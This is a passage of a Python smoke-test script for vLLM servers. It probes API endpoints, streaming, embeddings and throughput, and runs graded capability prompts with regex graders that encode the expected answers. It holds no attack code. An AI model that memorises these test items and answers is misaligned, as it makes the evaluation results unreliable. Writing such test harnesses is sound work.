            comp_resp = http_post_json(f"{base_url}/v1/completions", comp_body)
            if not comp_resp:
                cwarn("/v1/completions not supported or returned no response (expected for chat-only models)")
            else:
                try:
                    comp_text = json.loads(comp_resp)["choices"][0]["text"]
                except Exception:
                    comp_text = ""
                if comp_text:
                    cpass(f'Text completion succeeded: "The capital of France is{comp_text}"')
                else:
                    cwarn("Text completion response malformed (may be unsupported)")
        step()

        # ── 7. Embeddings (fully skipped for chat-only models) ──────────────
        if first_model and cap_embed:
            section("7. Embeddings  (POST /v1/embeddings)", color)
            emb_resp = http_post_json(f"{base_url}/v1/embeddings", {"model": first_model, "input": "Hello, world!"})
            if not emb_resp:
                cfail("No response from /v1/embeddings")
                result.failures += 1
            else:
                try:
                    emb_len = len(json.loads(emb_resp)["data"][0]["embedding"])
                except Exception:
                    emb_len = 0
                if emb_len > 0:
                    cpass(f"Embeddings returned vector of length {emb_len}")
                else:
                    cfail("Embeddings endpoint responded but no vector returned")
                    result.failures += 1

            batch_resp = http_post_json(
                f"{base_url}/v1/embeddings", {"model": first_model, "input": ["Hello, world!", "Goodbye, world!"]}
            )
            try:
                batch_count = len(json.loads(batch_resp)["data"]) if batch_resp else 0
            except Exception:
                batch_count = 0
            if batch_count == 2:
                cpass("Batch embeddings returned 2 vectors for 2 inputs")
            else:
                cwarn(f"Batch embeddings request did not return 2 vectors (got {batch_count})")
        step()

        # ── 7b. Embedding semantic quality ──────────────────────────────────
        if first_model and cap_embed:
            section("7b. Embedding semantic quality", color)
            sim_resp = http_post_json(
                f"{base_url}/v1/embeddings",
                {
                    "model": first_model,
                    "input": [
                        "The cat sat on the mat.",
                        "A feline rested on the rug.",
                        "Quantum entanglement defies classical intuition.",
                    ],
                },
            )
            if not sim_resp:
                cwarn("Could not fetch vectors for similarity check")
            else:
                try:
                    vecs = [d["embedding"] for d in json.loads(sim_resp)["data"]]
                    vec_a, vec_b, vec_c = vecs[0], vecs[1], vecs[2]
                except Exception:
                    vec_a = vec_b = vec_c = None
                if vec_a and vec_b and vec_c:
                    sim_ab = cosine_similarity(vec_a, vec_b)
                    sim_ac = cosine_similarity(vec_a, vec_c)
                    cinfo(f"cos(similar pair)   = {sim_ab}")
                    cinfo(f"cos(unrelated pair) = {sim_ac}")
                    quality.total += 1
                    if sim_ab > sim_ac:
                        cpass("Similar sentences score higher cosine similarity than an unrelated one")
                        quality.passed += 1
                    else:
                        cwarn("Similar sentences did NOT score higher cosine similarity than an unrelated one")
                else:
                    cwarn("Could not parse vectors for similarity check")
        step()

        # ── 8. Model self-description prompts ───────────────────────────────
        if first_model and cap_chat:
            section("8. Model self-description prompts", color)
            for prompt in (
                "What is your max context window length in tokens?",
                "List any special capabilities you have, such as vision, code, tool use, or multilingual support.",
                "What languages can you respond in?",
            ):
                body = {"model": first_model, "max_tokens": 1536, "temperature": 0.1, "messages": [{"role": "user", "content": prompt}]}
                resp = http_post_json(f"{base_url}/v1/chat/completions", body)
                text = extract_message_text(resp)
                if text:
                    console.print(f"  [bold]Q:[/bold] {prompt}")
                    console.print(f"  A: {text}")
                    console.print()
                else:
                    cwarn(f"No response for: {prompt} (may need a larger max_tokens budget for this reasoning model)")
        step()

        # ── 9. Streaming check ───────────────────────────────────────────────
        if first_model and cap_chat:
            section("9. Streaming  (POST /v1/chat/completions  stream=true)", color)
            stream_body = {
                "model": first_model,
                "max_tokens": 30,
                "temperature": 0,
                "stream": True,
                "messages": [{"role": "user", "content": "Say hello in one sentence."}],
            }
            data = json.dumps(stream_body).encode("utf-8")
            req = urllib.request.Request(
                f"{base_url}/v1/chat/completions",
                data=data,
                headers=_headers(True),
                method="POST",
            )
            chunks: list[str] = []
            try:
                with urllib.request.urlopen(req, timeout=30) as r:
                    for i, raw_line in enumerate(r):
                        if i >= 5:
                            break
                        chunks.append(raw_line.decode("utf-8", "replace").rstrip("\n"))
            except Exception:
                pass
            if any("data:" in c for c in chunks):
                cpass("Streaming response received (first chunks):")
                for c in chunks[:3]:
                    console.print(f"  {c}")
            else:
                cwarn("Streaming check inconclusive (may still work — check manually)")
        step()

        # ══════════════════════════════════════════════════════════════════
        # MODEL QUALITY & CAPABILITY TESTS (10-30) + CODE GEN SUITE (31-37)
        # ══════════════════════════════════════════════════════════════════
        if first_model and cap_chat:
            qtok = 1024

            section("10. Reasoning  (multi-step logic)", color)
            r = chat_once(base_url, first_model, "Alice is older than Bob. Carol is younger than Bob. Who is the oldest of the three? Reply with only the name.", qtok)
            grade("Logical ordering -> Alice", r, "alice", quality)
            step()

            section("11. Math  (word problem)", color)
            r = chat_once(base_url, first_model, "A shirt costs $40. It is discounted 25%, then 10% sales tax is added to the discounted price. What is the final price in dollars? Reply with only the number.", qtok)
            grade("Arithmetic -> 33", r, r"(^|[^0-9.])33([^0-9]|$)", quality)
            step()

            section("12. Text summarization", color)
            sum_src = (
                "Photosynthesis is the process by which green plants, algae, and some bacteria convert "
                "light energy, usually from the sun, into chemical energy stored in glucose. It takes "
                "place in the chloroplasts, uses carbon dioxide and water, and releases oxygen as a "
                "byproduct. This process is the foundation of most food chains on Earth."
            )
            r = chat_once(base_url, first_model, f"Summarize the following text in one short sentence:\n\n{sum_src}", qtok)
            grade("Summary captures the core topic", r, "photosynthes", quality)
            step()

            section("13. Instruction following  (strict JSON)", color)
            r = chat_once(base_url, first_model, 'Respond with ONLY minified JSON, no markdown and no code fences, of the exact form {"city":"","country":""} giving the capital of France.', qtok)
            clean = re.sub(r"```json|```", "", r)
            json_matches = re.findall(r"\{[^{}]*\}", clean)
            json_only = json_matches[-1] if json_matches else ""
            quality.total += 1
            city_ok = False
            if json_only:
                try:
                    city_ok = "paris" in json.loads(json_only).get("city", "").lower()
                except Exception:
                    city_ok = False
            if city_ok:
                cpass(f"Valid JSON, city=Paris: {json_only}")
                quality.passed += 1
            else:
                cwarn("Did not return valid JSON with city=Paris")
                if r:
                    console.print(f"     got: {r.strip().replace(chr(10), ' ')[:160]}")
            step()

            section("14. Code generation", color)
            r = chat_once(base_url, first_model, "Write a Python function named is_prime(n) that returns True if n is prime. Output only the code.", qtok)
            grade("Defines is_prime()", r, r"def[ \t]+is_prime", quality)
            step()

            section("15. Factual knowledge", color)
            r = chat_once(base_url, first_model, "What is the chemical symbol for gold? Reply with only the symbol.", qtok)
            grade("Gold -> Au", r, r"(^|[^A-Za-z])Au([^A-Za-z]|$)", quality)
            step()

            section("16. Long-context needle retrieval", color)
            needle = "PLUM-4417"
            hay_parts = [f"Log line {i}: routine status nominal, nothing to report. " for i in range(1, 61)]
            hay_parts.append(f"NOTE: the vault access code is {needle}. ")
            hay_parts += [f"Log line {i}: routine status nominal, nothing to report. " for i in range(61, 121)]
            hay = "".join(hay_parts)
            r = chat_once(base_url, first_model, f"The following is a long log. Find the vault access code buried in it and reply with only the code.\n\n{hay}", qtok)
            grade(f"Recalled needle {needle}", r, r"PLUM[- ]?4417", quality)
            step()

            section("17. Translation  (multilingual)", color)
            r = chat_once(base_url, first_model, "Translate the phrase 'good morning' into French. Reply with only the translation.", qtok)
            grade("EN->FR 'bonjour'", r, "bonjour", quality)
            step()

            section("18. Sentiment classification", color)
            r = chat_once(base_url, first_model, "Classify the sentiment of this review as POSITIVE or NEGATIVE. Reply with one word.\n\nReview: I absolutely loved this movie, it was fantastic and moving!", qtok)
            grade("Detected POSITIVE", r, "positive", quality)
            step()

            section("19. Vision / OCR  (multimodal image input)", color)
            vbody = {
                "model": first_model,
                "max_tokens": 64,
                "temperature": 0,
                "messages": [
                    {
                        "role": "user",
                        "content": [
                            {"type": "text", "text": "What text is written in this image? Reply with only the exact text."},
                            {"type": "image_url", "image_url": {"url": f"data:image/png;base64,{OCR_PNG_B64}"}},
                        ],
                    }
                ],
            }
            vresp = http_post_json(f"{base_url}/v1/chat/completions", vbody)
            vtext = extract_message_text(vresp)
            if not vresp or not vtext:
                cwarn("Vision not supported by this model (no multimodal image input) — skipped")
            else:
                grade("OCR read 'VLLM-OCR-7392'", vtext, r"VLLM[- ]?OCR[- ]?7392|OCR[- ]?7392", quality)
            step()

            section("20. Audio processing  (speech-to-text)", color)
            areq = http_post_multipart_audio(
                f"{base_url}/v1/audio/transcriptions", base64.b64decode(SPEECH_MP3_B64), first_model
            )
            if not areq:
                cwarn("Audio/ASR not supported (no /v1/audio/transcriptions — needs a Whisper/ASR model) — skipped")
            else:
                try:
                    atext = json.loads(areq).get("text", "") or areq
                except Exception:
                    atext = areq
                grade("Transcribed 'the quick brown fox'", atext, "quick|brown|fox", quality)
            step()

            section("21. Summarization accuracy  (multi-fact article)", color)
            art21 = (
                "Meridian County officials confirmed Thursday that engineer Priya Nakamura will lead the "
                "replacement of the Route 9 bridge, a project expected to cost 12.6 million dollars and "
                "finish by March 2027. The current bridge, built in 1968, has been restricted to vehicles "
                "under 10 tons since a 2023 inspection found corrosion in its support beams. Nakamura said "
                "the new design adds a dedicated bike lane."
            )
            r21 = chat_once(
                base_url, first_model,
                "Summarize the following article in 2-3 sentences, making sure to include the name of the "
                f"person leading the project, the total cost, and the expected finish date:\n\n{art21}",
                qtok,
            )
            quality.total += 1
            if (
                re.search("nakamura", r21, re.IGNORECASE)
                and re.search(r"12\.6|12,600,000|\$12", r21, re.IGNORECASE)
                and re.search("2027", r21, re.IGNORECASE)
            ):
                cpass("Summary accurately includes name, cost, and finish date")
                quality.passed += 1
            else:
                cwarn("Summary missing one or more key facts (name=Nakamura, cost=12.6M, date=2027)")
                if r21:
                    console.print(f"     got: {r21.strip().replace(chr(10), ' ')[:200]}")
            step()

            section("22. Counting  (numbers embedded in text)", color)
            r = chat_once(
                base_url, first_model,
                "Count how many numbers in the following list are greater than 50. Reply with only the "
                "count as a digit.\n\nThe readings were: 12, 87, 34, 91, 56, 3, 68, 45, 72, 19, 50, 99.",
                qtok,
            )
            grade("Correct count of numbers > 50 -> 6", r, r"(^|[^0-9])6([^0-9]|$)", quality)
            step()

            section("23. Pulling info from a PDF  (extract + summarize)", color)
            if not PDF_TEXT:
                cwarn("Skipped — pdftotext not installed locally (used to extract text from the test PDF before sending it to the model)")
            else:
                r = chat_once(
                    base_url, first_model,
                    "The following text was extracted from a PDF document. Write a one-sentence summary "
                    f"that includes the confirmation code and the opening date mentioned:\n\n{PDF_TEXT}",
                    qtok,
                )
                quality.total += 1
                if re.search(r"DOC[- ]?9931[- ]?B", r, re.IGNORECASE) and re.search("november", r, re.IGNORECASE):
                    cpass(f"Accurately summarized PDF-extracted text (code + date present): {r.strip()[:160]}")
                    quality.passed += 1
                else:
                    cwarn("Summary of PDF-extracted text missing the confirmation code or date")
                    if r:
                        console.print(f"     got: {r.strip().replace(chr(10), ' ')[:200]}")
            step()

            section("24. Table lookup  (structured data)", color)
            r = chat_once(
                base_url, first_model,
                "Here is a small table of quarterly revenue in thousands of dollars:\n\n"
                "| Quarter | Revenue |\n|---------|---------|\n| Q1 | 120 |\n| Q2 | 145 |\n| Q3 | 98 |\n| Q4 | 210 |\n\n"
                "Which quarter had the highest revenue? Reply with only the quarter, e.g. Q1.",
                qtok,
            )
            grade("Correctly identifies Q4 as highest", r, "q4", quality)
            step()

            section("25. Multi-turn context retention", color)
            body25 = {
                "model": first_model,
                "max_tokens": qtok,
                "temperature": 0,
                "messages": [
                    {"role": "user", "content": "My favorite programming language is Rust."},
                    {"role": "assistant", "content": "Got it, Rust is your favorite programming language."},
                    {"role": "user", "content": "What did I say my favorite programming language was? Reply with only the name."},
                ],
            }
            resp25 = http_post_json(f"{base_url}/v1/chat/completions", body25)
            r25 = extract_message_text(resp25)
            grade("Recalled earlier turn -> Rust", r25, "rust", quality)
            step()

            section("26. Careful reading  (negation)", color)
            r = chat_once(base_url, first_model, "Of these three cities — Tokyo, Lima, and Oslo — which one is NOT in the Southern Hemisphere and NOT in Asia? Reply with only the city name.", qtok)
            grade("Correctly resolves negation -> Oslo", r, "oslo", quality)
            step()

            section("27. Unit conversion  (numeric tolerance)", color)
            r = chat_once(base_url, first_model, "Convert 5 miles to kilometers. Reply with only the number, rounded to one decimal place.", qtok)
            quality.total += 1
            unit_m = re.search(r"[0-9]+\.[0-9]+", r)
            if unit_m and 7.8 < float(unit_m.group(0)) < 8.2:
                cpass(f"5 miles converted within tolerance of 8.0 km (got {unit_m.group(0)})")
                quality.passed += 1
            else:
                cwarn("Unit conversion outside tolerance or unparseable")
                if r:
                    console.print(f"     got: {r.strip().replace(chr(10), ' ')[:160]}")
            step()

            section("28. Date arithmetic", color)
            r = chat_once(base_url, first_model, "If today is Wednesday, what day of the week will it be in 10 days? Reply with only the day name.", qtok)
            grade("Correct day -> Saturday", r, "saturday", quality)
            step()

            section("29. Structured extraction to JSON", color)
            r = chat_once(
                base_url, first_model,
                "Extract the name, email, and phone number from this text as minified JSON with keys "
                "name, email, phone. No markdown, no code fences.\n\nText: \"Reach out to Marcus Webb at "
                "marcus.webb@example.com or call 555-201-4488 with any questions.\"",
                qtok,
            )
            clean = re.sub(r"```json|```", "", r)
            json_matches = re.findall(r"\{[^{}]*\}", clean)
            json_only = json_matches[-1] if json_matches else ""
            quality.total += 1
            fields_ok = False
            if json_only:
                try:
                    d = json.loads(json_only)
                    fields_ok = "marcus.webb@example.com" in d.get("email", "").lower() and "555-201-4488" in d.get("phone", "")
                except Exception:
                    fields_ok = False
            if fields_ok:
                cpass(f"Valid JSON with correct email and phone: {json_only}")
                quality.passed += 1
            else:
                cwarn("Structured extraction missing or incorrect fields")
                if r:
                    console.print(f"     got: {r.strip().replace(chr(10), ' ')[:200]}")
            step()

            section("30. Code bug fix", color)
            r = chat_once(
                base_url, first_model,
                "This Python function is supposed to return the sum of a list but has a bug:\n\n"
                "def total(nums):\n    result = 0\n    for n in nums:\n        result = n\n    return result\n\n"
                "Reply with only the corrected function.",
                qtok,
            )
            grade("Fixes accumulator bug (result += n or result = result + n)", r, r"result[ \t]*(\+=|=[ \t]*result[ \t]*\+)", quality)
            step()

            # ── Code generation suite (31-37) ───────────────────────────────
            code_gen_test(
                base_url, first_model, "31", "Python3 (basic)",
                "Write a basic Python3 function named bubble_sort(nums) that sorts a list of integers in "
                "ascending order using the bubble sort algorithm (do not use sorted() or .sort()). Include "
                "a short usage example. Provide the code in a single fenced code block with clear, properly "
                "indented, multi-line formatting and brief comments. No explanation outside the code block.",
                quality, color,
            )
            step()

            code_gen_test(
                base_url, first_model, "32", "PHP (basic)",
                "Write a basic PHP script that defines a function calculateFactorial($n) which returns the "
                "factorial of $n, and then prints the factorial of 5. Include the opening and closing PHP "
                "tags. Provide the code in a single fenced code block with clear, properly indented, "
                "multi-line formatting and brief comments. No explanation outside the code block.",
                quality, color,
            )
            step()

            code_gen_test(
                base_url, first_model, "33", "Bash / Shell scripting (basic)",
                "Write a basic Bash shell script that loops through the numbers 1 to 20 and prints only the "
                "even numbers, one per line, with a comment explaining the logic. Provide the code in a "
                "single fenced code block with clear, properly indented, multi-line formatting. No "
                "explanation outside the code block.",
                quality, color,
            )
            step()

            code_gen_test(
                base_url, first_model, "34", "Node.js (basic)",
                "Write a basic Node.js script, using only built-in core modules (no npm packages), that "
                "asynchronously reads a file named data.txt and prints its contents to the console, with "
                "proper error handling for a missing file. Provide the code in a single fenced code block "
                "with clear, properly indented, multi-line formatting and brief comments. No explanation "
                "outside the code block.",
                quality, color,
            )
            step()

            code_gen_test(
                base_url, first_model, "35", "MySQL SELECT with JOINs and GROUP BY (advanced)",
                "Write an advanced MySQL query that selects each customer's name and their total number of "
                "orders, joining a customers table (columns: id, name) with an orders table (columns: id, "
                "customer_id, order_date), grouping by customer, including only customers with more than 3 "
                "orders, and ordering the results by order count descending. Provide the query in a single "
                "fenced sql code block, formatted across multiple readable lines with each clause (SELECT, "
                "FROM, JOIN, GROUP BY, HAVING, ORDER BY) on its own line. No explanation outside the code block.",
                quality, color,
            )
            step()

            code_gen_test(
                base_url, first_model, "36", "MongoDB query (medium)",
                "Write a MongoDB query, using mongosh shell syntax, that finds all documents in the products "
                "collection where price is greater than 50 and category is 'electronics', sorted by price "
                "descending, returning only the name and price fields. Provide the query in a single fenced "
                "javascript code block with clear, properly indented, multi-line formatting. No explanation "
                "outside the code block.",
                quality, color,
            )
            step()

            code_gen_test(
                base_url, first_model, "37", "JavaScript (medium)",
                "Write a medium-difficulty JavaScript function named groupByProperty(arr, prop) that takes "
                "an array of objects and a property name, and returns an object grouping the array elements "
                "by the value of that property. Include a short example usage with sample output shown as a "
                "comment. Provide the code in a single fenced code block with clear, properly indented, "
                "multi-line formatting and brief comments. No explanation outside the code block.",
                quality, color,
            )
            step()

            # ── Workload suite (38) — questions from tester_llamacpp.py ─────
            if jobs:
                run_workload_suite(base_url, first_model, ctx, jobs, args, quality, result, color, step)
        else:
            reason = "no model discovered" if not first_model else "model does not support chat/completions (embedding-only model)"
            cwarn(f"Skipping capability tests 10-38 — {reason}")
            progress.update(task, completed=total_steps)
            progress.refresh()

        # ── Capability scorecard ────────────────────────────────────────────
        section(f"Capability Scorecard — {base_url}", color)
        if first_model:
            cinfo(f"Model : {first_model}")
            cinfo(f"Context size : {fmt_ctx(ctx)}")
            if quality.total:
                pct = quality.passed * 100 // quality.total
                cinfo(f"Quality score : {quality.passed}/{quality.total} graded checks passed ({pct}%)")
            else:
                cwarn("No graded checks were run")
        else:
            cwarn("No model discovered — nothing to score")

        section(f"Tokens per second — all answers ({base_url})", color)
        st = THROUGHPUT.stats()
        print_throughput_stats(st, color)
        if st:
            result.tps_min, result.tps_avg, result.tps_max = st["min"], st["avg"], st["max"]
        cinfo(f"Instance test duration: {fmt_duration(time.perf_counter() - start_time)}")

        if first_model and cap_chat:
            result.suggestions = instance_suggestions(
                base_url, ctx, st, args, metrics_before, vllm_metrics(base_url), len(jobs)
            ) + result.suggestions
            print_suggestions(result.suggestions, f"Suggestions — {base_url}")

    result.quality_pass = quality.passed
    result.quality_total = quality.total
    result.duration_s = time.perf_counter() - start_time
    return result


# ─────────────────────────────────────────────────────────────────────────────
# Roll-up report
# ─────────────────────────────────────────────────────────────────────────────
def fmt_duration(seconds: float) -> str:
    m, sec = divmod(int(round(seconds)), 60)
    h, m = divmod(m, 60)
    return f"{h}h {m:02d}m {sec:02d}s" if h else f"{m}m {sec:02d}s" if m else f"{seconds:.1f}s"


def print_rollup_report(results: list[InstanceResult]) -> None:
    section("Roll-Up Report")
    table = Table(box=box.SIMPLE_HEAVY, show_lines=False)
    table.add_column("Model", style="bold")
    table.add_column("Instance")
    table.add_column("Context", justify="right")
    table.add_column("Duration", justify="right")
    table.add_column("Capabilities")
    table.add_column("Failures", justify="right")
    table.add_column("Quality Score", justify="right")
    table.add_column("Workloads", justify="right")
    table.add_column("Tok/s min / avg / max", justify="right")

    total_duration = 0.0
    for res, color in zip(results, INSTANCE_COLORS * (len(results) // len(INSTANCE_COLORS) + 1)):
        total_duration += res.duration_s
        caps = []
        if res.cap_chat:
            caps.append("chat")
        if res.cap_embed:
            caps.append("embed")
        caps_s = "+".join(caps) if caps else ("unreachable" if not res.reachable else "n/a")
        quality_s = f"{res.quality_pass}/{res.quality_total}" if res.quality_total else "—"
        fail_style = "bold red" if res.failures else "green"
        tps_s = (
            f"{res.tps_min:.1f} / {res.tps_avg:.1f} / {res.tps_max:.1f}" if res.tps_avg is not None else "—"
        )
        table.add_row(
            f"[{color}]{res.model}[/{color}]",
            res.base_url,
            f"{res.context_len:,}" if res.context_len else "—",
            fmt_duration(res.duration_s),
            caps_s,
            f"[{fail_style}]{res.failures}[/{fail_style}]",
            quality_s,
            f"{res.workload_ok}/{res.workload_checked}" if res.workload_checked else "—",
            tps_s,
        )
    console.print(table)
    cinfo(f"Total test time across all instances: {fmt_duration(total_duration)}")


# ─────────────────────────────────────────────────────────────────────────────
# main
# ─────────────────────────────────────────────────────────────────────────────
def main() -> int:
    global API_KEY, THINKING
    run_start = time.perf_counter()
    parser = argparse.ArgumentParser(description="vLLM smoke test with a Rich UI")
    parser.add_argument("host", nargs="?", default="localhost")
    parser.add_argument("port", nargs="?", default=None)
    parser.add_argument("--thinking", choices=["on", "off"],
                        help="send enable_thinking on/off to the chat template (default: server/model default)")
    parser.add_argument("--max-tokens", type=int, default=8192,
                        help="max_tokens for each workload question (default 8192; thinking models need room)")
    parser.add_argument("--only", default="", metavar="AREA[,AREA...]",
                        help="run only workload questions whose name contains one of these, e.g. f5,gps")
    parser.add_argument("--no-workloads", action="store_true", help="skip the workload suite (test 38)")
    parser.add_argument("--list", action="store_true", help="list workload question names and exit")
    parser.add_argument("--long-prompt", type=int, nargs="?", const=2000, default=0, metavar="TOKENS",
                        help="add a ~TOKENS-token prompt (default 2000) to measure real prefill speed")
    parser.add_argument("--context-test", action="store_true",
                        help="fill the reported max context with a hidden code near the start and check recall")
    parser.add_argument("--context-test-fraction", type=float, default=0.9, metavar="F",
                        help="fraction of the reported context to fill for --context-test (default 0.9)")
    parser.add_argument("--concurrency", type=int, default=1, metavar="N",
                        help="send workload questions N at a time (tests batching/contention)")
    parser.add_argument("--no-cache", action="store_true",
                        help="send cache_prompt=false (llama.cpp only; vLLM prefix caching is server-wide)")
    parser.add_argument("--full-responses", action="store_true", help="don't truncate long workload answers")
    parser.add_argument("--api-key", default=None, help="Bearer token for servers started with --api-key "
                        "(default: $VLLM_API_KEY)")
    args = parser.parse_args()

    if args.list:
        for q in QUESTIONS:
            console.print(f"  • {q[0]}")
        console.print(f"  • {LONG_PROMPT_LABEL}  (with --long-prompt)")
        console.print(f"  • {CONTEXT_TEST_LABEL}  (with --context-test)")
        return 0
    if args.api_key:
        API_KEY = args.api_key
    if args.thinking:
        THINKING = args.thinking == "on"

    console.print()
    console.print(Rule(f"[bold cyan]tester_vllm.py[/bold cyan]", style="cyan", align="left"))
    cinfo(f"Author  : {SCRIPT_AUTHOR}")
    cinfo(f"Version : {SCRIPT_VERSION}")
    cinfo(f"Updated : {SCRIPT_UPDATED}")

    print_system_hardware()
    if not run_performance_health_check(args.host):
        section("Summary")
        cwarn("Testing aborted after the performance degradation check.")
        return 1

    section("0. vLLM Instance Discovery")
    if args.port:
        cinfo(f"Explicit port supplied — testing only {args.host}:{args.port}")
        targets = [(args.host, args.port)]
    else:
        targets = discover_instances(args.host)

    if not targets:
        cfail("No vLLM ports discovered — nothing to test.")
        console.print(f"  Hint: start vLLM, or pass an explicit target: {sys.argv[0]} {args.host} <port>")
        return 1

    cinfo(f"Will test {len(targets)} instance(s): {format_targets(targets)}")
    ctx_table = Table(box=box.SIMPLE, title="Models and context size")
    for col, just in [("Instance", "left"), ("Model", "left"), ("Context", "right"), ("Source", "left")]:
        ctx_table.add_column(col, justify=just)
    for host, port in targets:
        m, c, src = get_model_info(f"http://{host}:{port}")
        ctx_table.add_row(f"{host}:{port}", m or "[red](unreachable)[/red]", fmt_ctx(c), src or "—")
    console.print(ctx_table)

    results: list[InstanceResult] = []
    failures_total = 0
    for i, (host, port) in enumerate(targets):
        color = INSTANCE_COLORS[i % len(INSTANCE_COLORS)]
        res = run_instance_tests(host, port, color, args)
        results.append(res)
        failures_total += res.failures

    print_rollup_report(results)

    measured = [r for r in results if r.tps_avg is not None]
    if measured:
        cinfo(
            "Tokens/s across all instances: "
            f"min {min(r.tps_min for r in measured):.1f} / "
            f"avg {sum(r.tps_avg for r in measured) / len(measured):.1f} / "
            f"max {max(r.tps_max for r in measured):.1f}"
        )

    if len(results) > 1:
        # Per-instance suggestions were printed with each instance; repeat only
        # the ones that apply to more than one so the summary stays short.
        seen: dict[str, int] = {}
        for r in results:
            for sug in r.suggestions:
                seen[sug] = seen.get(sug, 0) + 1
        common = [sug for sug, n in seen.items() if n > 1]
        if common:
            print_suggestions(common, "Suggestions that apply to every instance")

    section("Summary")
    cinfo(f"Tested {len(targets)} instance(s): {format_targets(targets)}")
    cinfo(f"Total duration (hardware + health checks + all tests): {fmt_duration(time.perf_counter() - run_start)}")
    if failures_total == 0:
        cpass("All critical checks passed across all instances")
    else:
        cfail(f"{failures_total} critical check(s) failed across all instances")

    return failures_total


if __name__ == "__main__":
    sys.exit(main())
